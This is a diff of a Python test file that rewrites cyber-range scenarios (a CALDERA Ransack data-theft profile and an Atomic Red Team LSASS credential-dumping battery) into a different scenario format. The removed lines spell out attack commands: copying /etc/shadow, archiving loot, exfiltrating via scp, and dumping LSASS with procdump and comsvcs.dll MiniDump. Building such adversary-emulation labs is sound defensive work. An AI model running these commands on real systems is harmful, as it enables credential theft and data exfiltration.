@@ -436,81 +436,46 @@ entities:
 CALDERA_RANSACK = """
 name: caldera-ransack
 description: >
-  CALDERA Ransack adversary profile: 18-step data theft operation
-  modeled as attack steps with MITRE ATT&CK mapping.
+  CALDERA Ransack adversary profile modeled as SDL: data theft
+  with exfiltration check via OCR scoring pipeline.
 
-metadata:
-  id: caldera-ransack
-  name: CALDERA Ransack Adversary
-  description: Multi-step data theft operation inspired by CALDERA adversary profiles
-  difficulty: advanced
-  estimated_minutes: 45
-  tags: [caldera, data-theft, exfiltration]
-  mitre_attack:
-    tactics: [Discovery, Collection, Exfiltration]
-    techniques: [T1083, T1119, T1005, T1074, T1560, T1048]
+nodes:
+  lab-net: {type: Switch}
+  victim: {type: VM, os: linux, resources: {ram: 2 gib, cpu: 1}}
+  kali: {type: VM, os: linux, resources: {ram: 2 gib, cpu: 2}}
 
-mode: red
+infrastructure:
+  lab-net: {count: 1, properties: {cidr: 10.0.0.0/24, gateway: 10.0.0.1}}
+  victim: {count: 1, links: [lab-net]}
+  kali: {count: 1, links: [lab-net]}
 
-containers:
-  required: [kali, victim]
+conditions:
+  exfil-check:
+    command: "test -f /home/kali/operations/exfil/loot.tar.gz"
+    interval: 30
 
-objectives:
-  red:
-    - id: discover-files
-      description: Discover sensitive files on target
-      type: manual
-      points: 50
-    - id: stage-data
-      description: Stage collected data for exfiltration
-      type: command_output
-      points: 100
-      command_output:
-        container: victim
-        command: "ls /tmp/staged/"
-        contains: ["sensitive"]
-    - id: exfiltrate
-      description: Exfiltrate data to attacker-controlled host
-      type: file_exists
-      points: 150
-      file_exists:
-        container: kali
-        path: /home/kali/operations/exfil/loot.tar.gz
-  blue: []
+metrics:
+  exfil-success:
+    type: CONDITIONAL
+    max-score: 100
+    condition: exfil-check
 
-steps:
-  - step_number: 1
-    technique_id: T1083
-    technique_name: File and Directory Discovery
-    tactic: Discovery
-    description: Enumerate sensitive file locations
-    target: victim
-    commands: ["find / -name '*.conf' -o -name '*.key' 2>/dev/null"]
-  - step_number: 2
-    technique_id: T1005
-    technique_name: Data from Local System
-    tactic: Collection
-    description: Collect sensitive files
-    target: victim
-    commands: ["cp /etc/shadow /tmp/staged/"]
-  - step_number: 3
-    technique_id: T1074
-    technique_name: Data Staged
-    tactic: Collection
-    description: Stage data in temporary directory
-    target: victim
-    commands: ["tar czf /tmp/staged/loot.tar.gz /tmp/staged/"]
-  - step_number: 4
-    technique_id: T1048
-    technique_name: Exfiltration Over Alternative Protocol
-    tactic: Exfiltration
-    description: Exfiltrate via SCP
-    target: kali
-    commands: ["scp victim:/tmp/staged/loot.tar.gz /home/kali/operations/exfil/"]
+evaluations:
+  data-theft:
+    metrics: [exfil-success]
+    min-score: {absolute: 100}
 
-scoring:
-  passing_score: 150
-  max_score: 300
+tlos:
+  exfiltration:
+    name: Data Exfiltration
+    evaluation: data-theft
+
+goals:
+  ransack-goal:
+    tlos: [exfiltration]
+
+entities:
+  attacker: {name: Ransack Operator, role: Red}
 """
 
 
@@ -521,75 +486,51 @@ scoring:
 ATOMIC_CRED_DUMP = """
 name: atomic-credential-dumping
 description: >
-  Atomic Red Team T1003.001 credential dumping tests adapted
-  to SDL format. Tests LSASS memory access techniques.
+  Atomic Red Team T1003.001 credential dumping modeled as SDL:
+  Windows target with weak credentials, manual grading via metrics.
 
-metadata:
-  id: atomic-cred-dump
-  name: Credential Dumping Test Battery
-  description: LSASS credential dumping techniques from Atomic Red Team
-  difficulty: intermediate
-  estimated_minutes: 30
-  tags: [atomic-red-team, credential-access, lsass]
-  mitre_attack:
-    techniques: [T1003.001]
+nodes:
+  lab-net: {type: Switch}
+  target:
+    type: VM
+    os: windows
+    os_version: "10"
+    resources: {ram: 4 gib, cpu: 2}
+    vulnerabilities: [lsass-access]
 
-mode: red
+infrastructure:
+  lab-net: {count: 1, properties: {cidr: 10.0.0.0/24, gateway: 10.0.0.1}}
+  target: {count: 1, links: [lab-net]}
 
-containers:
-  required: [kali, victim]
+vulnerabilities:
+  lsass-access:
+    name: "LSASS Memory Access"
+    description: "Local admin can dump LSASS process memory"
+    technical: true
+    class: CWE-522
 
-objectives:
-  red:
-    - id: procdump-lsass
-      description: Dump LSASS using ProcDump
-      type: manual
-      points: 50
-    - id: comsvcs-dump
-      description: Dump LSASS using comsvcs.dll MiniDump
-      type: manual
-      points: 50
-    - id: mimikatz-extract
-      description: Extract credentials with Mimikatz
-      type: command_output
-      points: 100
-      command_output:
-        container: kali
-        command: cat /home/kali/operations/creds.txt
-        contains: ["Username", "Password"]
-  blue: []
+metrics:
+  cred-dump-grade:
+    type: MANUAL
+    artifact: true
+    max-score: 100
 
-steps:
-  - step_number: 1
-    technique_id: T1003.001
-    technique_name: "LSASS Memory"
-    tactic: "Credential Access"
-    description: "Dump LSASS process memory via ProcDump"
-    target: victim
-    commands:
-      - 'procdump.exe -accepteula -ma lsass.exe lsass.dmp'
-    expected_detections:
-      - product_name: wazuh
-        severity_id: 4
-        description: Process access to LSASS detected
-        max_detection_time_seconds: 30
-  - step_number: 2
-    technique_id: T1003.001
-    technique_name: "LSASS Memory"
-    tactic: "Credential Access"
-    description: "Dump via comsvcs.dll MiniDump"
-    target: victim
-    commands:
-      - 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID dump.bin full'
-    expected_detections:
-      - product_name: wazuh
-        severity_id: 5
-        description: Rundll32 loading comsvcs.dll for MiniDump
-        max_detection_time_seconds: 15
+evaluations:
+  cred-assessment:
+    metrics: [cred-dump-grade]
+    min-score: {absolute: 50}
 
-scoring:
-  passing_score: 100
-  max_score: 200
+tlos:
+  cred-access:
+    name: Credential Access Techniques
+    evaluation: cred-assessment
+
+goals:
+  atomic-goal:
+    tlos: [cred-access]
+
+entities:
+  pentester: {name: Penetration Tester, role: Red}
 """
 
 
@@ -1573,11 +1514,13 @@ def test_scenario_parses_and_validates(label, yaml_str):
     # Verify the scenario has meaningful content
     has_nodes = bool(scenario.nodes)
     has_features = bool(scenario.features)
-    has_steps = bool(scenario.steps)
-    has_objectives = bool(scenario.objectives.red or scenario.objectives.blue)
     has_stories = bool(scenario.stories)
     has_entities = bool(scenario.entities)
-    assert any([has_nodes, has_features, has_steps, has_objectives, has_stories]), \
+    has_vulns = bool(scenario.vulnerabilities)
+    has_metrics = bool(scenario.metrics)
+    has_content = bool(scenario.content)
+    assert any([has_nodes, has_features, has_stories, has_entities,
+                has_vulns, has_metrics, has_content]), \
         f"{label} parsed but has no content"
 
 
